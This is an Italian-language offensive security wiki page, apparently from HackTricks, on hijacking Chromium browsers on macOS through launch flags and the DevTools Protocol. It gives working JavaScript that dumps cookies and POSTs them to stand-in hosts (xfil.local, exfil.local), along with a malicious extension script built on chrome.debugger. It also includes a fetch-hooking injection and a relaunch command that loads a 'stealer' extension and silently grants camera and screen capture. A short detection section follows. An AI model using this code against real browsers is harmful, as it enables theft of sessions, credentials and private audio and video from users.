# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Informazioni di base

I browser basati su Chromium, come Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi e Opera, utilizzano tutti gli stessi command-line switches, preference files e interfacce di automazione DevTools. Su macOS, qualsiasi utente con accesso alla GUI può terminare una sessione browser esistente e riaprirla con flags, extensions o endpoint DevTools arbitrari che vengono eseguiti con gli entitlement del target.

#### Avvio di Chromium con flags personalizzati su macOS

macOS mantiene una singola istanza UI per ogni profilo Chromium, quindi la strumentazione normalmente richiede la chiusura forzata del browser (ad esempio con `osascript -e 'tell application "Google Chrome" to quit'`). Gli attacker in genere eseguono nuovamente il browser tramite `open -na "Google Chrome" --args <flags>` per poter iniettare argomenti senza modificare l'app bundle. Inserire questo comando all'interno di un user LaunchAgent (`~/Library/LaunchAgents/*.plist`) o di un login hook garantisce che il browser manomesso venga riavviato dopo un reboot o un logoff.

#### Flag `--load-extension`

Il flag `--load-extension` carica automaticamente le extensions non impacchettate (percorsi separati da virgole). Usalo insieme a `--disable-extensions-except` per bloccare le extensions legittime e forzare l'esecuzione esclusiva del tuo payload. Le extensions malevole possono richiedere permissions ad alto impatto come `debugger`, `webRequest` e `cookies` per passare ai protocolli DevTools, modificare gli header CSP, effettuare il downgrade di HTTPS o esfiltrare il materiale della sessione non appena il browser viene avviato.<sup>[[4]](#references)</sup>

#### Flags `--remote-debugging-port` / `--remote-debugging-pipe`

Questi switches espongono il Chrome DevTools Protocol (CDP) tramite TCP o pipe, permettendo a strumenti esterni di controllare il browser. Google ha osservato un abuso diffuso di questa interfaccia da parte degli infostealer e, a partire da Chrome 136 (marzo 2025), gli switches vengono ignorati per il profilo predefinito a meno che il browser non venga avviato con un `--user-data-dir` non standard. Questo applica l'App-Bound Encryption ai profili reali, ma gli attacker possono comunque creare un nuovo profilo, indurre la vittima ad autenticarsi al suo interno (con phishing/triage assistance) e raccogliere cookies, tokens, stati di device trust o registrazioni WebAuthn tramite CDP.<sup>[[5]](#references)</sup>

#### Flag `--user-data-dir`

Questo flag reindirizza l'intero profilo del browser (History, Cookies, Login Data, Preference files, ecc.) verso un percorso controllato dall'attacker. È obbligatorio quando si combinano le build moderne di Chrome con `--remote-debugging-port` e mantiene inoltre isolato il profilo manomesso, permettendo di inserire files `Preferences` o `Secure Preferences` precompilati che disabilitano i security prompts, installano automaticamente le extensions e modificano gli schemes predefiniti.

#### Flag `--use-fake-ui-for-media-stream`

Questo switch bypassa il permission prompt per la fotocamera e il microfono, quindi qualsiasi pagina che chiami `getUserMedia` ottiene immediatamente l'accesso. Combinalo con flags come `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` o comandi CDP `Browser.grantPermissions` per acquisire silenziosamente audio/video, condividere il desktop o soddisfare i permission checks di WebRTC senza interazione dell'utente.<sup>[[4]](#references)</sup>

## Pattern di delivery e relaunch osservati in natura

L'abuso di CDP è comunemente una fase di **post-exploitation**, piuttosto che il payload iniziale. Una recente campagna su macOS mirata agli sviluppatori utilizzava una fase di build Xcode **`Run Script`** avvelenata (`PBXShellScriptBuildPhase`), in modo che il codice venisse eseguito solo quando la vittima **eseguiva il build** del progetto, non quando si limitava a clonarlo o aprirlo. Dopo la prima esecuzione, il malware infettava anche altri alberi `.xcodeproj`, aggiungeva hooks Git `pre-commit` malevoli e cercava altri progetti Xcode negli archivi ZIP.<sup>[[3]](#references)</sup>

Per l'abuso di Chromium questo è importante perché l'attacker non deve applicare patch al browser binary. Uno stager di breve durata nella build phase / `osascript` può invece installare un **browser wrapper** (LaunchAgent, login item, voce del Dock, app launcher trojanizzato, ecc.) che riapre il browser legittimo con flags controllati dall'attacker ogni volta che l'utente lo avvia.<sup>[[3]](#references)</sup>

> [!TIP]
> Sugli endpoint degli sviluppatori, controlla i files `.pbxproj`, `.git/hooks/pre-commit` e gli ZIP contenenti `.xcodeproj` alla ricerca di `curl`, `osascript`, `xxd`, `base64` annidati o logica di relaunch di Chrome inattesi.

## Remote Debugging e abuso del DevTools Protocol

Una volta riavviato Chrome con un `--user-data-dir` dedicato e `--remote-debugging-port`, puoi collegarti tramite CDP (ad esempio usando `chrome-remote-interface`, `puppeteer` o `playwright`) e automatizzare workflows con privilegi elevati:

- **Furto di cookies/sessioni:** `Network.getAllCookies` e `Storage.getCookies` restituiscono valori HttpOnly anche quando l'App-Bound encryption normalmente impedirebbe l'accesso al filesystem, perché CDP chiede al browser in esecuzione di decrittarli.
- **Manomissione delle permissions:** `Browser.grantPermissions` e `Emulation.setGeolocationOverride` permettono di bypassare i permission prompts per fotocamera e microfono (specialmente se combinati con `--use-fake-ui-for-media-stream`) o di falsificare i security checks basati sulla posizione.
- **Iniezione di keystrokes/scripts:** `Runtime.evaluate` esegue JavaScript arbitrario nella tab attiva, consentendo il furto di credenziali, la modifica del DOM o l'iniezione di beacon di persistence che sopravvivono alla navigazione.<sup>[[1]](#references)</sup>
- **Esfiltrazione live:** `Network.webRequestWillBeSentExtraInfo` e `Fetch.enable` intercettano richieste/risposte autenticate in tempo reale senza toccare gli artifacts su disco.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Poiché Chrome 136 blocca CDP sul profilo predefinito, copiare la directory esistente `~/Library/Application Support/Google/Chrome` della vittima in un percorso di staging non consente più di ottenere cookie decrittografati. In alternativa, si può fare social engineering all'utente inducendolo ad autenticarsi all'interno del profilo strumentato (ad esempio, durante una sessione di supporto "utile") oppure catturare i token MFA in transito tramite network hooks controllati da CDP.<sup>[[5]](#references)</sup>

### XCSSET-style CDP Backdoor Chain

Un pattern pratico di malware consiste nel:

1. Riavviare ogni volta l'implant o il wrapper userland all'avvio di Chrome.
2. Avviare il browser legittimo con `--remote-debugging-port=<port>` e, su Chrome 136+, generalmente con un `--user-data-dir=<dir>` associato e non predefinito.
3. Avviare un helper che si connette al WebSocket CDP locale e registra un pre-document hook con `Page.addScriptToEvaluateOnNewDocument`.<sup>[[2]](#references)</sup>

Questo helper può iniettare JavaScript **prima** dell'esecuzione del codice del sito, risultando ideale per applicare hook a `window.fetch`, `XMLHttpRequest`, wallet provider o flussi di autofill senza modificare i file sul disco.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Una variante più potente trasforma il browser in un **host command bridge**: il JavaScript iniettato emette un `console.log` contrassegnato da un delimitatore, l'helper locale monitora `Runtime.consoleAPICalled`, rimuove il marker, esegue il resto tramite la shell dell'host (ad esempio `exec.Command` di Go) e restituisce stdout/stderr tramite il WebSocket dell'attaccante. Questo trasforma l'esecuzione di script a livello di tab in una reverse shell per lo più fileless.<sup>[[3]](#references)</sup>

## Injection basata su estensione tramite Debugger API

La ricerca del 2023 "Chrowned by an Extension" ha dimostrato che un'estensione malevola che utilizza l'API `chrome.debugger` può collegarsi a qualsiasi tab e ottenere gli stessi poteri DevTools di `--remote-debugging-port`.<sup>[[6]](#references)</sup> Questo infrange le ipotesi originali di isolamento (le estensioni rimangono nel proprio contesto) e consente:

- Furto silenzioso di cookie e credenziali con `Network.getAllCookies`/`Fetch.getResponseBody`.
- Modifica delle autorizzazioni dei siti (camera, microfono, geolocalizzazione) e bypass degli avvisi di sicurezza interstitial, permettendo alle pagine di phishing di impersonare le finestre di dialogo di Chrome.
- Manomissione on-path degli avvisi TLS, dei download o dei prompt WebAuthn tramite il controllo programmatico di `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` o `Security.handleCertificateError`.

Carica l'estensione con `--load-extension`/`--disable-extensions-except` in modo da non richiedere alcuna interazione dell'utente. Uno script di background minimale che weaponizza l'API è simile al seguente:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
L'estensione può anche sottoscriversi agli eventi `Debugger.paused` per leggere le variabili JavaScript, modificare gli script inline o inserire breakpoint personalizzati che persistono durante la navigazione. Poiché tutto viene eseguito all'interno della sessione GUI dell'utente, Gatekeeper e TCC non vengono attivati, rendendo questa tecnica ideale per malware che ha già ottenuto l'esecuzione nel contesto dell'utente.<sup>[[6]](#references)</sup>

## Rilevamento e Hunting

- Generare un alert quando i browser Chromium vengono avviati con `--remote-debugging-port`, `--remote-debugging-pipe` o un `--user-data-dir` sospetto, soprattutto quando il processo padre è `bash`, `sh`, `osascript`, `xcodebuild` o un helper LaunchAgent.
- Cercare catene brevi in cui un helper apre un WebSocket CDP locale, registra `Page.addScriptToEvaluateOnNewDocument` e quindi stabilisce una connessione WebSocket/HTTPS outbound di lunga durata.
- Cercare bridge console-to-shell correlando l'attività `Runtime.consoleAPICalled` del browser con shell figlie o processi helper che eseguono comandi forniti dall'attacker.
- Sui Mac degli sviluppatori, esaminare le entry `PBXShellScriptBuildPhase` nei file `.pbxproj`, gli hook Git `pre-commit`, i relauncher del Dock/login item e i progetti Xcode contenuti in ZIP alla ricerca dell'installazione di wrapper del browser.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Strumenti

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatizza l'avvio di Chromium con estensioni contenenti payload ed espone hook CDP interattivi.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Tool simile, focalizzato sull'intercettazione del traffico e sull'instrumentation del browser per operatori macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Libreria Node.js per creare script che analizzano i dump del Chrome DevTools Protocol (cookie, DOM, permessi) una volta attiva un'istanza con `--remote-debugging-port`.

### Esempio
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Trova altri esempi nei link agli strumenti.

## Riferimenti

- [1] [Chrome DevTools Protocol - dominio Runtime](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - dominio Page](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [Il ritorno dell'assassino di Xcode: analisi approfondita dell'ultima versione di XCSSET - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) su X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Modifiche agli switch di remote debugging per migliorare la sicurezza - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned da un'estensione: abuso del Chrome DevTools Protocol tramite la Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
